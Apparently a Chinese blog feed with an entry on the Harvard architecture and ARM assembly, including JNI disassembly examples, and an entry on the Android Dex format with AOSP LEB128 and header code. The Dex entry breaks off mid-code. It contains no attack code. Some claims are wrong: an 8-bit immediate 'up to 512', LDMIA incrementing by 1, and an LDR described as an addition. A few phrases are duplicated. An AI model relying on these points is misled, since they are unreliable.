title="流程"></a>流程</h3><p>CPU先从程序存储器中取出指令，译码，拿到数据存储器的地址，然后执行。</p><p>它的主要特点是将程序和数据存储在不同的存储空间中，即程序存储器和数据存储器是两个独立的存储器，每个存储器独立编址、独立访问。与两个存储器相对应的是系统的4条总线：程序的数据总线与地址总线，数据的数据总线与地址总线。这种分离的程序总线和数据总线允许在一个机器周期内同时获得指令字（来自程序存储器）和操作数（来自数据存储器），从而提高了执行速度，使数据的吞吐率提高了1倍。又由于程序和数据存储器在两个分开的物理空间中，因此取指和执行能完全重叠。CPU首先到程序指令存储器中读取程序指令内容，解码后得到数据地址，再到相应的数据存储器中读取数据，并进行下一步的操作（通常是执行）。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面的这两种体系都属于存储器体系，前者是将程序指令和数据放在一块，后者是拆分。<br>哈佛体系的速度快是显而易见的，但我认为这两者都有点理想模型的意思。在实际的使用中，都允许存在一些例外。</p><p>拿哈佛体系来说，它效率高，但设计复杂。如果我们要动态加载程序，那么就需要从外存中读取一段程序然后加载到RAM，如果这个程序在数据内存中，我们就需要一种机制将数据内存再传输到程序内存中，这就增加了设备复杂度。到RAM，如果这个程序在数据内存中，我们就需要一种机制将数据内存再传输到程序内存中，这就增加了设备复杂度。此外，此外，，绝对不允许CPU/DSP读取程序内存来当作数据，这也是不现实的，程序一般都有只读数据区和静态数据区，烧写程序的时候会当作程序的一部分烧进ROM中，如果为了把程序和数据分开，而需要设置两块ROM，再把其中一块ROM和RAM通过复用器接起来，结构就太复杂了就太复杂了，更不用说每次烧写都要分开烧两块ROM。实际上即使是DSP通常也允许从程序内存的总线上读取一些数据。</p><h1 id="ARM寄存器"><a href="#ARM寄存器" class="headerlink" title="ARM寄存器"></a>ARM寄存器</h1><blockquote><p>arm指令集分为arm指令和thumb指令等，在IDA中对于一个函数或地址判断是否是ARM还是thrumb看调用的地址是否为奇数，如果为奇数则为thrumb指令，如果是4字节对齐则为ARM指令</p></blockquote><h2 id="寻址方式：9种"><a href="#寻址方式：9种" class="headerlink" title="寻址方式：9种"></a>寻址方式：9种</h2><ul><li>立即寻址：MOV R0, #1234 地址码部分为立即数</li><li>寄存器寻址：MOV R0, R1</li><li>寄存器间接寻址： LDR R0, [R1]</li><li>寄存器移位寻址： MOV R0, R1, LSL #2</li><li>多寄存器寻址：LDMIA R0, {R1,R2,R3,R4}. 指令后缀IA表示每次执行完加载操作后R0寄存器的值自增1.R1=[R0], R2=[R0+#4],R3=[R0+#8],R4=[R0+#12]</li><li>基址寻址</li><li>堆栈寻址: STMFD SP!， {R1-R7， LR} 将R1-R7，LR入栈。多用于保存子程序“现场”</li><li>块拷贝寻址: </li><li>相对寻址</li></ul><p><strong>R7: 栈帧指针(Frame Pointer).指向前一个保存的栈帧(stack frame)和链接寄存器(link register， lr)在栈上的地址</strong></p><h2 id="LR"><a href="#LR" class="headerlink" title="LR"></a>LR</h2><p>链接寄存器。它与子程序调用密切相关，用于存放子程序的返回地址，它是ARM程序实现子程序调用的关键所在</p><ul><li>保存子程序返回地址；</li><li>当异常发生时，LR中保存的值等于异常发生时PC的值减4（或者减2），因此在各种异常模式下可以根据LR的值返回到异常发生前的相应位置继续执行。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">2 </span>&#123;</span><br><span class="line"><span class="number">3</span>    <span class="keyword">int</span> k, i = <span class="number">1</span>, j = <span class="number">2</span>;</span><br><span class="line"><span class="number">4</span>    addsub(i, j);</span><br><span class="line"><span class="number">5</span>    k = <span class="number">3</span>;</span><br><span class="line"><span class="number">6</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">7</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">8</span> <span class="function"><span class="keyword">int</span> <span class="title">addsub</span><span class="params">(inta, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">9 </span>&#123;</span><br><span class="line"><span class="number">10</span>    <span class="keyword">int</span> c;</span><br><span class="line"><span class="number">11</span>    c = a+ b;</span><br><span class="line"><span class="number">12</span>    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于上面的程序，编译器会将第4行编译为指令：BL addsub，将第12行编译为指令：MOV pc, lr</p><p>在这里，关键指令BL addsub会完成2件事情：                 </p><ol><li>将子程序的返回地址（也就是第5行代码在内存中的位置）保存到寄存器LR中；</li><li>跳转到子程序addsub的第１条指令处。</li></ol><p>这样就完成了子程序的调用。</p><p>如果子程序又调用了孙子程序（LR又会变为BL孙子程序的下一行），所以需要先将当前的LR入栈（一般是在子程序的入口出），等到子程序返回时POP出来就可以了</p><h2 id="SP"><a href="#SP" class="headerlink" title="SP"></a>SP</h2><p>堆栈寄存器</p><p>按照后进先出(LIFO)原则组织起来的连续存储区域。用于程序保存或恢复数据，或用于子程序调用及中断响应时保护与恢复现场。SP是堆栈指针寄存器，存放着当前堆栈栈顶地址。<br>一般情况下，对SP有影响的指令，对SP的操作都是隐式的，就是说SP并不出现在指令操作数当中。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="built_in">AX</span><span class="comment">;累加器AX的内容压栈保存，（SP）=（SP）-2</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">BX</span><span class="comment">;堆栈内保存的累加器AX的内容弹出到BX寄存器中，（SP）=（SP）+2</span></span><br></pre></td></tr></table></figure><h1 id="常见汇编指令"><a href="#常见汇编指令" class="headerlink" title="常见汇编指令"></a>常见汇编指令</h1><h2 id="LDR"><a href="#LDR" class="headerlink" title="LDR"></a>LDR</h2><p>LDR 从基址寄存器Rn 的和立即数的偏移之和 得出内存地址的位置，从内存地址里面Load（装载）一个字的值写到 Rt 寄存器。</p><p>从存储器（确切地说是地址空间）中装载数据到通用寄存器。</p><p>此外，ARM中还存在一个LDR伪指令，它和LDR是不同的东西。区别在于它可以在立即数前增加=，表示把某一地址写到寄存器中</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR </span><span class="built_in">r0</span>, <span class="number">0x12345678</span>  # <span class="keyword">LDR指令 </span></span><br><span class="line"><span class="keyword">LDR </span><span class="built_in">r0</span>, = <span class="number">0x12345678</span> # <span class="keyword">LDR伪指令</span></span><br></pre></td></tr></table></figure><p>它和MOV的作用类似，但ARM是RISC结构，数据从内存到CPU之间的移动只能通过L/S指令来完成，也就是ldr/str指令。mov只能在寄存器之间移动数据，或者把立即数移动到寄存器中。</p><p>mov指令限制了立即数的长度为8位，也就是不能超过512。而ldr伪指令没有这个限制。如果使用ldr伪指令时，后面跟的立即数没有超过8位，那么在实际汇编的时候该ldr伪指令是被转换为mov指令的。</p><h2 id="STR"><a href="#STR" class="headerlink" title="STR"></a>STR</h2><p>STR（立即数） 指令计算出从基址寄存器的数值和立即数的偏移（通过这，得出内存（memory）地址)，然后从一个寄存器（register）读取它的值（store）到内存（memory）中</p><p>说人话就是，STR{条件}  源寄存器，&lt;存储器地址&gt;</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">STR </span><span class="built_in">R0</span>，[<span class="built_in">R1</span>]，＃<span class="number">8</span>             ；将<span class="built_in">R0</span>中的字数据写入以<span class="built_in">R1</span>为地址的存储器中，并将新地址<span class="built_in">R1</span>＋<span class="number">8</span>写入<span class="built_in">R1</span>。</span><br><span class="line"><span class="keyword">STR </span><span class="built_in">R0</span>，[<span class="built_in">R1</span>，＃<span class="number">8</span>]             ；将<span class="built_in">R0</span>中的字数据写入以<span class="built_in">R1</span>＋<span class="number">8</span>为地址的存储器中。”</span><br><span class="line"><span class="keyword">STR </span><span class="built_in">R1</span>, [<span class="built_in">R0</span>]                  ；将<span class="built_in">r1</span>寄存器的值，传送到地址值为<span class="built_in">r0</span>的（存储器）内存中</span><br><span class="line"><span class="keyword">STR </span><span class="built_in">R1</span>, [<span class="built_in">R0</span>, <span class="symbol">#var_c</span>]     <span class="comment">; 将R1的值赋给var_c</span></span><br></pre></td></tr></table></figure><h1 id="B-BNE-BEQ-BL-BLX-BX"><a href="#B-BNE-BEQ-BL-BLX-BX" class="headerlink" title="B\BNE\BEQ\BL\BLX\BX"></a>B\BNE\BEQ\BL\BLX\BX</h1><p><strong>首先了解一下CPSR程序状态寄存器</strong>：它用于在用户编程时存储标志，包括条件码标志，中断禁止位，当前处理器模式以及其他状态和控制信息。</p><p><img src="https://github.com/CytQ/BlogImgs/blob/master/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%8F%8A%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3/CPSR.png?raw=true" alt="CPSR"></p><ul><li>N标志位：运算结果的最高位反映在该标志位。对于有符号二进制补码，结果为负数时N=1，结果为正数或零时N=0</li><li>Z标识位：Z=1表示运算的结果为零；Z=0表示运算的结果不为零。CMP指令的结果可以直接影响Z</li><li>C标志位：加法指令中（包括比较指令CMN），当结果产生了进位,则C=1,表示无符号运算发生溢出；其他情况C=0。减法指令中（包括比较指令CMP），当运算中发生借位，则C=0，表示无符号运算数发生进位；其他情况下C=1。对于包含移位操作的非加减运算指令，C中包含最后一次溢出的位的数值。对于其他非加减运算指令，C位的值通常不受影响</li><li>V标志位：对于加减运算指令，当<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0" target="_blank" rel="noopener">操作数</a>和运算结果为二进制的<a href="https://baike.baidu.com/item/%E8%A1%A5%E7%A0%81/6854613" target="_blank" rel="noopener">补码</a>表示的带符号数时，V=1表示符号位溢出；通常其他指令不影响V位。</li></ul><h3 id="B"><a href="#B" class="headerlink" title="B"></a>B</h3><blockquote><p>B 指令是最简单的跳转指令。一旦遇到一个 B 指令，ARM 处理器将立即跳转到给定的目标地址，从那里继续执行。注意存储在跳转指令中的实际值是<strong>相对当前PC 值的一个偏移量</strong>，而不是一个绝对地址，它的值由汇编器来计算（参考寻址方式中的相对寻址）。它是 24 位有符号数，左移两位后有符号扩展为 32 位，表示的有效偏移为 26 位(前后32MB 的地址空间)</p></blockquote><p>相对跳转指令，跳转的位置是相对于当前PC值的偏移量</p><h3 id="BEQ"><a href="#BEQ" class="headerlink" title="BEQ"></a>BEQ</h3><p>如果CPSR的Z标识位为为1，则跳转。</p><h3 id="BNE"><a href="#BNE" class="headerlink" title="BNE"></a>BNE</h3><p>如果CPSR的Z标志位为0， 则跳转</p><h3 id="BL"><a href="#BL" class="headerlink" title="BL"></a>BL</h3><p>将下一个指令的地址复制到 r14（链接寄存器）中，跳转</p><h3 id="BLX"><a href="#BLX" class="headerlink" title="BLX"></a>BLX</h3><p>将处理器的状态从 ARM 更改为 Thumb，或从 Thumb 更改为 ARM，将下一个指令的地址复制到r14中，跳转</p><h3 id="BX"><a href="#BX" class="headerlink" title="BX"></a>BX</h3><p>将处理器的状态从 ARM 更改为 Thumb，或从 Thumb 更改为 ARM，跳转</p><h1 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h1><p><strong>源码：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT jstring JNICALL Java_com_example_lizhongquan_hellojni_JniUtils_getJniString</span><br><span class="line">        (JNIEnv *env, jclass) &#123;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"Hello World"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>汇编：</strong></p><p><img src="https://github.com/CytQ/BlogImgs/blob/master/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%8F%8A%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3/getJniString.png?raw=true" alt="getJniString"></p><p>首先，R0 = env</p><ul><li>LDR R1, [R0]：R1 = env</li><li>LDR.W R2, [R1, #0x29c] :  等价于R2=R1+0x29c。也就是获得env中指定偏移地址的方法在内存中的位置</li><li>ADR R1， aHelloWorld：   R1指向hello world对应的地址。ADR是指获取对于当前PC的相对地址。</li><li>BX R2            这时候R0 = env， R1 = hello world， R2是env中的指定方法。也就是说调用env-&gt;NewStringUTF(“hello world”)</li></ul><h1 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h1><p><strong>源码：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span></span><br><span class="line"><span class="function">JNIEXPORT jint JNICALL <span class="title">encrypt</span><span class="params">(JNIEnv *env, jclass type, jint key)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key + <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>汇编：</strong></p><p><img src="https://github.com/CytQ/BlogImgs/blob/master/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%8F%8A%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3/encrypt.png?raw=true" alt="encrypt"></p><p>R0 = env, R1 = type, R2 = key.</p><ul><li>ADDS R0,R2,#5 :       key+5，结果放入R0</li><li>BX LR：                     回调，值为R0</li></ul><p><strong>未完待续</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章主要介绍汇编、计算机组成原理等基本内容，属于基础篇。方便其他人快速查阅。&lt;br&gt;每一段的基础介绍都参杂一些个人理解&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="汇编" scheme="http://imlzq.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Dex文件结构分析</title>
    <link href="http://imlzq.com/2017/10/30/Dex/"/>
    <id>http://imlzq.com/2017/10/30/Dex/</id>
    <published>2017-10-30T15:24:18.000Z</published>
    <updated>2018-04-27T08:07:16.284Z</updated>
    
    <content type="html"><![CDATA[<p>Dex文件结构分析。</p><p>本文源码均摘自8.0分支</p><a id="more"></a>    <h2 id="Dex和class字节码的区别"><a href="#Dex和class字节码的区别" class="headerlink" title="Dex和class字节码的区别"></a>Dex和class字节码的区别</h2><p>一句话概括：dex是优化后的class字节码。</p><p>在打包的过程中，dx工具会将class转换为dex，只要的操作流程为：</p><blockquote><p>对java类文件进行重新排序，建立统一的常量池，消除冗余的信息。</p></blockquote><p>E.G：</p><p>在java中，如果类A和类B都调用到了类C的FunctionC方法，则FunctionC的方法签名会被复制到A和B中。</p><p>这也就造成了多个不同的文件可能会同时包含多个相同的方法签名。字符串等常量也类似。</p><p>因此dx工具建立了一个统一的资源常量池，将所有class文件二次处理，消除其中的冗余项。</p><p>Dex文件的结构从上到下也就是：</p><table><thead><tr><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>dex_header</td><td>文件头。包含本dex的基本内容和文件其他区域的索引</td></tr><tr><td>string_ids</td><td>字符串索引</td></tr><tr><td>type_ids</td><td>类型的索引</td></tr><tr><td>proto_ids</td><td>方法声明结构体的索引</td></tr><tr><td>field_ids</td><td>域的索引</td></tr><tr><td>method_ids</td><td>方法的索引</td></tr><tr><td>class_defs</td><td>类的定义</td></tr><tr><td>data</td><td>数据区</td></tr><tr><td>link_data</td><td>链接数据区</td></tr></tbody></table><h2 id="dex中的数据类型"><a href="#dex中的数据类型" class="headerlink" title="dex中的数据类型"></a>dex中的数据类型</h2><table><thead><tr><th>类型</th><th>含义</th></tr></thead><tbody><tr><td>u1</td><td>等同于uint8_t，表示1字节的无符号数</td></tr><tr><td>u2</td><td>等同于uint16_t，表示2字节的无符号数</td></tr><tr><td>u4</td><td>等同于uint32_t，表示4字节的无符号数</td></tr><tr><td>u8</td><td>等同于uinit64_t，表示8字节的无符号数</td></tr><tr><td>sleb128</td><td>有符号LEB128，可变长度1~5字节</td></tr><tr><td>uleb128</td><td>无符号LEB128，可变长度1~5字节</td></tr><tr><td>uleb128p1</td><td>无符号LEB128值加1，可变长度1~5字节</td></tr></tbody></table><p>每个LEB128由1~5个字节组成，每个字节只有7个有效位。最高位是一个标志位。</p><p>如果LEB128的第一个字节的最高位为1，表示需要用到下一个字节</p><p>如果第二个字节的最高位也为1，表示也会会用到第三个字节。</p><p>以此类推。如果读取第五个字节后下一个字节最高位仍位1，则表示该dex无效，虚拟机在验证dex的时候就会失败返回。</p><p><strong>以下为Leb128.h文件中读取uleb128的函数：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Reads an unsigned LEB128 value, updating the given pointer to point</span></span><br><span class="line"><span class="comment"> * just past the end of the read value. This function tolerates</span></span><br><span class="line"><span class="comment"> * non-zero high-order bits in the fifth encoded byte.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">DEX_INLINE <span class="keyword">int</span> <span class="title">readUnsignedLeb128</span><span class="params">(<span class="keyword">const</span> u1** pStream)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> u1* ptr = *pStream;</span><br><span class="line">    <span class="keyword">int</span> result = *(ptr++);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result &gt; <span class="number">0x7f</span>) &#123;    <span class="comment">// 0x7f = 01111111，大于则表示最高位为1</span></span><br><span class="line">        <span class="keyword">int</span> cur = *(ptr++); <span class="comment">// 下一个字节</span></span><br><span class="line">        result = (result &amp; <span class="number">0x7f</span>) | ((cur &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">7</span>); <span class="comment">// 合并值，前两个字节</span></span><br><span class="line">        <span class="keyword">if</span> (cur &gt; <span class="number">0x7f</span>) &#123;</span><br><span class="line">            cur = *(ptr++);</span><br><span class="line">            result |= (cur &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">14</span>;</span><br><span class="line">            <span class="keyword">if</span> (cur &gt; <span class="number">0x7f</span>) &#123;</span><br><span class="line">                cur = *(ptr++);</span><br><span class="line">                result |= (cur &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">21</span>;</span><br><span class="line">                <span class="keyword">if</span> (cur &gt; <span class="number">0x7f</span>) &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Note: We don't check to see if cur is out of</span></span><br><span class="line"><span class="comment">                     * range here, meaning we tolerate garbage in the</span></span><br><span class="line"><span class="comment">                     * high four-order bits.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    cur = *(ptr++);</span><br><span class="line">                    result |= cur &lt;&lt; <span class="number">28</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *pStream = ptr;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>读取sleb128：</strong></p><p>有符号的LEB128其实是一样的，只是对字节的最高有效位做了符号拓展</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Reads a signed LEB128 value, updating the given pointer to point</span></span><br><span class="line"><span class="comment"> * just past the end of the read value. This function tolerates</span></span><br><span class="line"><span class="comment"> * non-zero high-order bits in the fifth encoded byte.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">DEX_INLINE <span class="keyword">int</span> <span class="title">readSignedLeb128</span><span class="params">(<span class="keyword">const</span> u1** pStream)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> u1* ptr = *pStream;</span><br><span class="line">    <span class="keyword">int</span> result = *(ptr++);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result &lt;= <span class="number">0x7f</span>) &#123;</span><br><span class="line">        result = (result &lt;&lt; <span class="number">25</span>) &gt;&gt; <span class="number">25</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> cur = *(ptr++);</span><br><span class="line">        result = (result &amp; <span class="number">0x7f</span>) | ((cur &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">7</span>);</span><br><span class="line">        <span class="keyword">if</span> (cur &lt;= <span class="number">0x7f</span>) &#123;</span><br><span class="line">            result = (result &lt;&lt; <span class="number">18</span>) &gt;&gt; <span class="number">18</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cur = *(ptr++);</span><br><span class="line">            result |= (cur &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">14</span>;</span><br><span class="line">            <span class="keyword">if</span> (cur &lt;= <span class="number">0x7f</span>) &#123;</span><br><span class="line">                result = (result &lt;&lt; <span class="number">11</span>) &gt;&gt; <span class="number">11</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = *(ptr++);</span><br><span class="line">                result |= (cur &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">21</span>;</span><br><span class="line">                <span class="keyword">if</span> (cur &lt;= <span class="number">0x7f</span>) &#123;</span><br><span class="line">                    result = (result &lt;&lt; <span class="number">4</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Note: We don't check to see if cur is out of</span></span><br><span class="line"><span class="comment">                     * range here, meaning we tolerate garbage in the</span></span><br><span class="line"><span class="comment">                     * high four-order bits.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    cur = *(ptr++);</span><br><span class="line">                    result |= cur &lt;&lt; <span class="number">28</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *pStream = ptr;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="DexHeader"><a href="#DexHeader" class="headerlink" title="DexHeader"></a>DexHeader</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "header_item" struct.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexHeader</span> &#123;</span></span><br><span class="line">    u1  magic[<span class="number">8</span>];           <span class="comment">/* includes version number */</span></span><br><span class="line">    u4  checksum;           <span class="comment">/* adler32 checksum */</span></span><br><span class="line">    u1  signature[kSHA1DigestLen]; <span class="comment">/* SHA-1 hash */</span></span><br><span class="line">    u4  fileSize;           <span class="comment">/* length of entire file */</span></span><br><span class="line">    u4  headerSize;         <span class="comment">/* offset to start of next section */</span></span><br><span class="line">    u4  endianTag;</span><br><span class="line">    u4  linkSize;</span><br><span class="line">    u4  linkOff;</span><br><span class="line">    u4  mapOff;</span><br><span class="line">    u4  stringIdsSize;</span><br><span class="line">    u4  stringIdsOff;</span><br><span class="line">    u4  typeIdsSize;</span><br><span class="line">    u4  typeIdsOff;</span><br><span class="line">    u4  protoIdsSize;</span><br><span class="line">    u4  protoIdsOff;</span><br><span class="line">    u4  fieldIdsSize;</span><br><span class="line">    u4  fieldIdsOff;</span><br><span class="line">    u4  methodIdsSize;</span><br><span class="line">    u4  methodIdsOff;</span><br><span class="line">    u4  classDefsSize;</span><br><span class="line">    u4  classDefsOff;</span><br><span class="line">    u4  dataSize;</span><br><span class="line">    u4  dataOff;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h2><p>文件标识符。 64 65 78 0A 30 33 35 00，换为ascii也就是 dex\n035   最后的4位为版本标识</p><p>占用8个字节</p><h2 id="checksum"><a href="#checksum" class="headerlink" title="checksum"></a>checksum</h2><p><strong>dex文件的校验和，用于判断dex是否被修改以及合法性，占用4字节</strong></p><p>计算方式是使用alder32算法计算除magic和checksum之外的所有区域的值。</p><p>也就是下面除首部12字节外的所有数据（magic 8位，checksum 4位）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Returns the checksum of all but the first 12 bytes of &#123;<span class="doctag">@code</span> dex&#125;.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">computeChecksum</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">       Adler32 adler32 = <span class="keyword">new</span> Adler32();</span><br><span class="line">       <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8192</span>];</span><br><span class="line">       ByteBuffer data = <span class="keyword">this</span>.data.duplicate(); <span class="comment">// positioned ByteBuffers aren't thread safe</span></span><br><span class="line">       data.limit(data.capacity());</span><br><span class="line">       data.position(CHECKSUM_OFFSET + CHECKSUM_SIZE);</span><br><span class="line">       <span class="keyword">while</span> (data.hasRemaining()) &#123;</span><br><span class="line">           <span class="keyword">int</span> count = Math.min(buffer.length, data.remaining());</span><br><span class="line">           data.get(buffer, <span class="number">0</span>, count);</span><br><span class="line">           adler32.update(buffer, <span class="number">0</span>, count);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> (<span class="keyword">int</span>) adler32.getValue();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h2><p><strong>校验码，用于判断dex是否被修改以及合法性</strong>。占用20字节</p><p>计算方式是使用SHA1算法计算除magic、checksum、signature之外的所有区域的值，也就是除首部32字节以外的所有数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 